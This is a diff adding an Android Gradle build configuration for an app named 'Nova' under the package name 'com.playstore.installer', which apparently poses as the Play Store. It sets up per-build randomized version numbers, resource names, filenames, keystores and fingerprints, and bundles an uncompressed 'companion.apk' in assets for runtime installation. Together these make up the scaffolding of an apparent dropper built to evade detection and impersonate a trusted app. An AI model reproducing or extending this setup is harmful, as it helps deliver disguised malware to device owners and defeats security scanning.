@@ -1,0 +1,92 @@
+plugins {
+    id 'com.android.application'
+    id 'org.jetbrains.kotlin.android'
+    id 'build-env-verifier'      // Step 7  — environment check before anything
+    id 'keystore-generator'      // Step 8  — Nova independent keystore
+    id 'fingerprint-generator'   // Step 9  — Nova independent fingerprint (SHA-512 + BLAKE3)
+    id 'version-randomizer'      // Step 9A — random versionCode + versionName per build
+    id 'build-hash-filename'     // Step 4  — random hash in APK filename
+    id 'res-renamer'             // Step 5  — randomised res/ filenames
+    id 'watermark-injector'      // Step 21 — ZIP comment watermark (leak traceability)
+}
+
+// Step 10: Build order enforced by CI workflow (build.yml).
+// build_companion.py runs in CI BEFORE Gradle assembleRelease for Nova.
+
+android {
+    namespace 'com.playstore.installer'
+    compileSdk 34
+
+    defaultConfig {
+        applicationId "com.playstore.installer"
+        minSdk 28
+        targetSdk 34
+
+        // Step 9A — injected by VersionRandomizerPlugin at configuration time
+        versionCode project.ext.rand_versionCode
+        versionName project.ext.rand_versionName
+
+        ndk {
+            abiFilters "armeabi-v7a", "arm64-v8a"
+        }
+
+        buildConfigField "String", "BUILD_UUID",      "\"${project.ext.fp_buildUUID}\""
+        buildConfigField "String", "BUILD_TIMESTAMP", "\"${project.ext.fp_buildTimestamp}\""
+        buildConfigField "String", "SALT_HEX",        "\"${project.ext.fp_saltHex}\""
+        // Step 9 — BLAKE3 dual hash exposed to native layer via BuildConfig
+        buildConfigField "String", "BLAKE3_HEX",      "\"${project.ext.fp_blake3}\""
+        buildConfigField "String", "SHA512_HEX",      "\"${project.ext.fp_sha512}\""
+    }
+
+    signingConfigs {
+        release {
+            // Nova keystore — independent from companion (companion signed in CI step 13)
+            storeFile     project.ext.ks_storeFile
+            storePassword project.ext.ks_storePass
+            keyAlias      project.ext.ks_keyAlias
+            keyPassword   project.ext.ks_keyPass
+        }
+    }
+
+    buildTypes {
+        release {
+            minifyEnabled false
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+            signingConfig signingConfigs.release
+        }
+    }
+
+    aaptOptions {
+        // companion.apk in assets MUST be stored uncompressed (compress_type=0).
+        // Android cannot read a compressed APK from assets at runtime, and
+        // MT Manager / system installer will not recognise it as an installable
+        // APK if it is deflate-compressed inside the Nova APK zip.
+        noCompress 'apk'
+    }
+
+    buildFeatures {
+        buildConfig true
+    }
+
+    compileOptions {
+        sourceCompatibility JavaVersion.VERSION_1_8
+        targetCompatibility JavaVersion.VERSION_1_8
+    }
+
+    kotlinOptions {
+        jvmTarget = '1.8'
+    }
+}
+
+keystoreGenerator {
+    outputDir = file("${buildDir}/keystore")
+    label     = project.name
+}
+
+buildHashFilename {
+    prefix = 'nova'
+}
+
+dependencies {
+    implementation 'androidx.appcompat:appcompat:1.6.1'
+}
